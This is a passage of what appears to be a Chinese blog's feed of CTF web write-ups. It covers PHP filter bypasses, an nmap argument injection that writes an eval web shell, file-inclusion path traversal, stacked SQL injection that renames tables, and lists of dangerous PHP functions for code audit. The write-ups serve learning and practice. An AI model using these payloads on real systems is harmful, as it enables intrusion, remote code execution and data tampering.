open");$a=$_GET['code'];if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){die("you die");}if(strlen($a)&gt;33){die("nonono.");}fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">index.php?code=&lt;?show_source('f','lag.php');?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>放bp base32解码</p><h2 id="2017-赛客夏令营-Web-weakphp（git泄露）"><a href="#2017-赛客夏令营-Web-weakphp（git泄露）" class="headerlink" title="2017-赛客夏令营-Web-weakphp（git泄露）"></a>2017-赛客夏令营-Web-weakphp（git泄露）</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519194833.png"></p><p>得到源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phprequire_once "flag.php";if (!isset($_GET['user']) &amp;&amp; !isset($_GET['pass'])) {    header("Location: index.php?user=1&amp;pass=2");}$user = $_GET['user'];$pass = $_GET['pass'];if ((md5($user) == md5($pass)) and ($user != $pass)){    echo $flag;} else {    echo "nonono!";}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组绕过md5的比较，弱类型绕过</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?user[]=1&amp;pass[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519195004.png"></p><h1 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h1><h2 id="2020-网鼎杯-朱雀组-Web-nmap"><a href="#2020-网鼎杯-朱雀组-Web-nmap" class="headerlink" title="2020-网鼎杯-朱雀组-Web-nmap"></a>2020-网鼎杯-朱雀组-Web-nmap</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519195904.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519195945.png"></p><p>不是命令执行，网上搜罗一番，说是可以写入webshell</p><p>，nmap命令行参数注入</p><p>源码大概的构造：</p><pre class="line-numbers language-none"><code class="language-none">echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以通过这种思路，拼接单引号，达到控制参数的目的，从而将我们构造的shell写入文件中</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">' &lt;?php @eval($_POST["hack"]);?&gt; -oG hack.php '<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>被拦截，提示hacker，改下后缀为phtml试试，发现并没有提示hacker，蚁剑连下试试</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519200339.png"></p><h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><h2 id="CISCN2021-easy-source"><a href="#CISCN2021-easy-source" class="headerlink" title="CISCN2021-easy_source"></a>CISCN2021-easy_source</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210515173805900.png"></p><p>扫下目录，.index.php.swo泄露</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515174118.png"></p><p>完整代码</p><pre class="line-numbers language-none"><code class="language-none">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？&lt;?phpclass User{    private static $c = 0;    function a()    {        return ++self::$c;    }    function b()    {        return ++self::$c;    }    function c()    {        return ++self::$c;    }    function d()    {        return ++self::$c;    }    function e()    {        return ++self::$c;    }    function f()    {        return ++self::$c;    }    function g()    {        return ++self::$c;    }    function h()    {        return ++self::$c;    }    function i()    {        return ++self::$c;    }    function j()    {        return ++self::$c;    }    function k()    {        return ++self::$c;    }    function l()    {        return ++self::$c;    }    function m()    {        return ++self::$c;    }    function n()    {        return ++self::$c;    }    function o()    {        return ++self::$c;    }    function p()    {        return ++self::$c;    }    function q()    {        return ++self::$c;    }    function r()    {        return ++self::$c;    }    function s()    {        return ++self::$c;    }    function t()    {        return ++self::$c;    }    }$rc=$_GET["rc"];$rb=$_GET["rb"];$ra=$_GET["ra"];$rd=$_GET["rd"];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag 在类的注释里面，通过实例化任意类，并调用类方法</p><p>然后根据PHP 内置类中的 <code>ReflectionMethod</code> 来读取 <code>User</code> 类里面各个函数的注释</p><p>我们可以这样构造，来获取注释内容</p><pre class="line-numbers language-none"><code class="language-none">?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515174523.png"></p><p>这个注释里没有flag，可以通过更改a的值（a-z）来获取不同的注释，这里使用burpsuite爆破下</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515174710.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210515174827.png"></p><h2 id="2017-赛客夏令营-Web-random"><a href="#2017-赛客夏令营-Web-random" class="headerlink" title="2017-赛客夏令营-Web-random"></a>2017-赛客夏令营-Web-random</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210519193738.png"></p><p>一直点提交就出来了诶</p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="漏洞关键字"><a href="#漏洞关键字" class="headerlink" title="漏洞关键字"></a>漏洞关键字</h2><blockquote><p>SQL注入</p></blockquote><pre class="line-numbers language-none"><code class="language-none">select insertupdatexmlmysql_querymuysqli...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>文件上传</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$_FILEStype="file"上传move_uploaded_file()...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>XSS跨站</p></blockquote><pre class="line-numbers language-none"><code class="language-none">printprint_rechosprintfdievar_dumpvar_export...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>文件包含</p></blockquote><pre class="line-numbers language-none"><code class="language-none">includeinclude_oncerequirerequire_once...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>代码执行</p></blockquote><pre class="line-numbers language-none"><code class="language-none">evalassertpregreplacecall_user_funccall_user_func_array...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>命令执行</p></blockquote><pre class="line-numbers language-none"><code class="language-none">systemexecshell_exec``passthrupcntl_execpopenproc_open...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>变量覆盖</p></blockquote><pre class="line-numbers language-none"><code class="language-none">extract()parse_str()import_request_variables()$$...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>反序列化</p></blockquote><pre class="line-numbers language-none"><code class="language-none">serialize()unserialize()_construct_destruct...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>其他漏洞</p></blockquote><pre class="line-numbers language-none"><code class="language-none">unlink()file_get_contents()show_source()file()fopen()...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>通用关键字</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$_GET$_POST$_REQUEST$_FILES$_SERVER...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>本地文件包含</p></blockquote><p>%00截断（magic_quotes_gpc=off;php版本&lt;5.3.4）</p><p>长度截断（windows=&gt;点好需要长于256字节；Linux要长于4096字节 vc   </p><blockquote><p>远程文件包含</p></blockquote><pre class="line-numbers language-none"><code class="language-none">?filename=gttp://www.aaa.com/readme.txt?filename=gttp://www.aaa.com/readme.txt%20?filename=gttp://www.aaa.com/readme.txt%23?filename=gttp://www.aaa.com/readme.txt?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-web-wp</title>
      <link href="2021/07/10/buuctf-web-wp/"/>
      <url>2021/07/10/buuctf-web-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>文件包含类题目</li><li>首先要去想，如何才能执行下面的include语句，要满足if语句中的3个条件，第三个条件主要就是分析出<code>mb_substr</code>函数截取之后</li></ul><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620154402.png"></p><p>滑稽~，直接查看源代码</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620154427.png"></p><p>提示source.php</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])        &amp;&amp; is_string($_REQUEST['file'])        &amp;&amp; emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据code找到页面中有个hint.php</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620154647.png"></p><p>首先，我们传入一个get型的参数file，在if语句中判断并满足三个条件都为<code>True</code>时，然后才会去<code>包含</code>传入的参数</p><ul><li>传参不为空</li><li>传参是字符串</li><li>传参要经过emmm类中的checkfile函数</li></ul><pre class="line-numbers language-none"><code class="language-none">if (! empty($_REQUEST['file'])        &amp;&amp; is_string($_REQUEST['file'])        &amp;&amp; emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们继续来分析下，checkfile函数，首先有一个whitelist，接着我们传进来的参数要经过三个if语句</p><ul><li><p>第一个if，不能让他返回<code>false</code>，所以需要传入的参数需要设置并且是字符串</p></li><li><p>第二个if，如果返回True的话，只能去包含指定的文件：source.php和hint.php，而我们是要想办法去包含刚刚hint.php中提示我们的ffffllllaaaagggg文件</p></li><li><p>第三个if，<code>mb_substr</code>函数实际上是substr截取字符的中文版，可以截取中文字符，可以从它设置的参数中发现，它从（0）起始位置截取<code>$page</code>，截取的长度通过函数<code>mb_strpos（返回第二个参数字符在第一个参数中第一次出现的位置）</code>来返回，整个这段意思就是截取?之前的字符串，比如<code>hint.php?file=/etc/passwd</code>，$_page的值会变成hint.php</p></li></ul><p>接着再进行白名单校验，返回True，然后就直接在最后去包含文件了</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">index.php?file=hint.php?../../../../ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行之后，执行到checkfile函数中的三个if时，会变成<code>hint.php</code>，显然hint.php满足白名单校验，所以返回True，三个if语句这时候都为真，就直接执行include语句，就能看到flag</p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>PHP万能密码登陆</li></ul><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620203052.png"></p><p>打开时一个登录框，直接上万能密码</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620203416.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620203547.png"></p><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>get型传参</li></ul><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620204027.png"></p><pre class="line-numbers language-none"><code class="language-none">$cat=$_GET['cat'];echo $cat;if($cat=='dog'){   echo 'Syc{cat_cat_cat_cat}'; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接传入一个参数<code>cat</code></p><pre class="line-numbers language-none"><code class="language-none">?cat=dog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620204201.png"></p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>（这题本身没有源码，源码是我从网上下载的便于学习）</p><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;head&gt;    &lt;meta charset="UTF-8"&gt;    &lt;title&gt;easy_sql&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;&lt;!-- sqlmap是没有灵魂的 --&gt;&lt;form method="get"&gt;    姿势: &lt;input type="text" name="inject" value="1"&gt;    &lt;input type="submit"&gt;&lt;/form&gt;&lt;pre&gt;&lt;?phpfunction waf1($inject) {    preg_match("/select|update|delete|drop|insert|where|\./i",$inject) &amp;&amp; die('return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);');}function waf2($inject) {    strstr($inject, "set") &amp;&amp; strstr($inject, "prepare") &amp;&amp; die('strstr($inject, "set") &amp;&amp; strstr($inject, "prepare")');}if(isset($_GET['inject'])) {    $id = $_GET['inject'];    waf1($id);    waf2($id);    $mysqli = new mysqli("127.0.0.1","root","root","supersqli");    //多条sql语句    $sql = "select * from `words` where id = '$id';";    $res = $mysqli-&gt;multi_query($sql);    if ($res){//使用multi_query()执行一条或多条sql语句      do{        if ($rs = $mysqli-&gt;store_result()){//store_result()方法获取第一条sql语句查询结果          while ($row = $rs-&gt;fetch_row()){            var_dump($row);            echo "&lt;br&gt;";          }          $rs-&gt;Close(); //关闭结果集          if ($mysqli-&gt;more_results()){  //判断是否还有更多结果集            echo "&lt;hr&gt;";          }        }      }while($mysqli-&gt;next_result()); //next_result()方法获取下一结果集，返回bool值    } else {      echo "error ".$mysqli-&gt;errno." : ".$mysqli-&gt;error;    }    $mysqli-&gt;close();  //关闭数据库连接}?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul><li><code>堆叠注入</code></li><li><code>show</code>也是可以查字段的</li><li>关注<code>multi_query()</code>，可能造成堆叠注入</li><li><code>handler</code>绕过select被限制</li><li><code>预编译</code>绕过select被限制</li><li><code>更改表名列名</code>绕过select被限制</li></ul><h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><blockquote><p>是否存在注入</p></blockquote><pre class="line-numbers language-none"><code class="language-none">1' or 1=2#1' or 1=1#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164415.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164444.png"></p><p>到这里发现存在注入，首先尝试<code>union select</code>联合查询注入</p><blockquote><p>联合查询注入（无法利用）</p></blockquote><p>查询列数</p><pre class="line-numbers language-none"><code class="language-none">1' order by 2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164648.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621164735.png"></p><p>这里过滤了很多字符，<code>select update delete drop insert where ./</code>，双写和大小写<code>select</code>无法绕过，这里我们经过一番探索，发现堆叠注入</p><blockquote><p>堆叠注入</p></blockquote><p>查库</p><pre class="line-numbers language-none"><code class="language-none">1';show database;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620211947.png"></p><p>查表</p><pre class="line-numbers language-none"><code class="language-none">1';show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620210241.png"></p><p>查询到当前存在一张名为<code>1919810931114514</code>，很特异，所以猜测flag存在在该表中</p><blockquote><p>查列</p></blockquote><pre class="line-numbers language-none"><code class="language-none">1';show columns from `1919810931114514`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210621165416.png"></p><p>这里还可使用<code>desc</code>，查看到列名</p><pre class="line-numbers language-none"><code class="language-none">1';desc `1919810931114514`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210620212200.png"></p><p><strong>要绕过<code>select</code>查询flag，有以下几种方式：</strong></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote><p>handler代替select</p></blockquote><p>网上搜索一番，mysql中有个<code>handler</code>语句可以代替select部分功能</p><p>handler语法如下：</p><pre class="line-numbers language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload</p><pre class="line-numbers language-none"><code class="language-none">1';handler `1919810931114514` open;handler `1919810931114514` read next;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>预编译</p></blockquote><p>预编译相关语法如下：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#拆分开来如下1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>strstr这个函数并不能区分大小写，我们将payload其大写即可</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#拆分开来如下：1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><blockquote><p>更改表名列名</p></blockquote><p>修改表名和列名的语法如下：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">修改表名(将表名user改为users)alter table user rename to users;修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#拆分开来如下1';alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候再去查询</p><pre class="line-numbers language-none"><code class="language-none">1' or 1=1#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就能查询到<code>1919810931114514</code>改名成<code>words</code>的内容了</p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p>网上找的源码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php    session_start();    include_once "config.php";    $post = array();    $get = array();    global $MysqlLink;    //GetPara();    $MysqlLink = mysqli_connect("localhost",$datauser,$datapass);    if(!$MysqlLink){        die("Mysql Connect Error!");    }    $selectDB = mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB){        die("Choose Database Error!");    }    foreach ($_POST as $k=&gt;$v){        if(!empty($v)&amp;&amp;is_string($v)){            $post[$k] = trim(addslashes($v));        }    }    foreach ($_GET as $k=&gt;$v){        }    }    //die();?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action="" method="post"&gt;&lt;input type="text" name="query"&gt;&lt;input type="submit"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    if(isset($post['query'])){        $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\"";        //var_dump(preg_match("/{$BlackList}/is",$post['query']));        if(preg_match("/{$BlackList}/is",$post['query'])){            //echo $post['query'];            die("Nonono.");        }        if(strlen($post['query'])&gt;40){            die("Too long.");        }        $sql = "select ".$post['query']."||flag from Flag";        mysqli_multi_query($MysqlLink,$sql);        do{            if($res = mysqli_store_result($MysqlLink)){                while($row = mysqli_fetch_row($res)){                    print_r($row);                }            }        }while(@mysqli_next_result($MysqlLink));    }?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul><li>*<code>查询法</code></li><li><code>操作符重置法</code></li></ul><h2 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h2><p>主页：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622204025.png"></p><p>输入参数1</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622204059.png"></p><blockquote><p>order by查询字段</p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622204228.png"></p><p>经过一番测试，发现过滤了<code>order by、select</code>等，双写，大小写也无法绕过</p><blockquote><p>堆叠查询</p></blockquote><pre class="line-numbers language-none"><code class="language-none">1;show databases;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-none"><code class="language-none">Array(    [0] =&gt; 1)Array(    [0] =&gt; ctf)Array(    [0] =&gt; ctftraining)Array(    [0] =&gt; information_schema)Array(    [0] =&gt; mysql)Array(    [0] =&gt; performance_schema)Array(    [0] =&gt; test)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">1;show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果：</p><pre class="line-numbers language-none"><code class="language-none">Array(    [0] =&gt; 1)Array(    [0] =&gt; Flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><blockquote><p>*查询法</p></blockquote><p>查询语句：</p><pre class="line-numbers language-none"><code class="language-none">select *,1||flag from Flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在本地测试一番：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210622210321.png"></p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">*,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><blockquote><p>操作符重置法</p></blockquote><p>查询语句：</p><pre class="line-numbers language-none"><code class="language-none">select 1;set sql_mode=PIPES_AS_CONCAT;select 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用<code>set sql_mode=PIPES_AS_CONCAT;</code>将||视为字符串的连接操作符而非或运算符。</p><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">1;set sql_mode=PIPES_AS_CONCAT;select 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><h2 id="知识点-5"><a 